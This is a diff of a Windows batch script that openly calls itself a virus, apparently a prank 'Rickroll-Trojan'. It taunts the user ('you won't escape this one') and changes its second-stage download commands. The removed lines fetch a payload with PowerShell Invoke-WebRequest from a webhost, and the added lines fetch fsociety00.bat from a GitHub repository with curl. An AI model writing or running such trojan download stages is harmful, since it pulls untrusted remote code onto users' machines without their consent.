@@ -39,12 +39,12 @@ if %answer%==yes goto activate
 if %answer%==no goto confused
 :confused
 echo WOOOOOOOOOOOW
-echo So you tell me that somehow the program skipped the code phase
+echo So you tell me that somehow you cheated
 echo And redirected you to Form2?
 echo Well then I guess I need to see what errors I did in it
 echo But I don't care so your still gonna get phase 2 of the virus
 echo PROJECT 00.DAT ACTIVATE!
-powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/fsociety00 -Outfile fsociety00.dat"
+curl -O https://raw.githubusercontent.com/hellisabove/Rickroll-Trojan/main/fsociety00.bat
 pause
 cls
 pause
@@ -53,7 +53,7 @@ exit
 :activate
 echo but trust me you won't escape this one
 echo PROJECT 00.DAT ACTIVATE
-curl --outfile final.bat https://raw.githubusercontent.com/hellisabove/Rickroll-Trojan/main/fsociety00.bat
+curl -O https://raw.githubusercontent.com/hellisabove/Rickroll-Trojan/main/fsociety00.bat
 cls
 pause
 cls
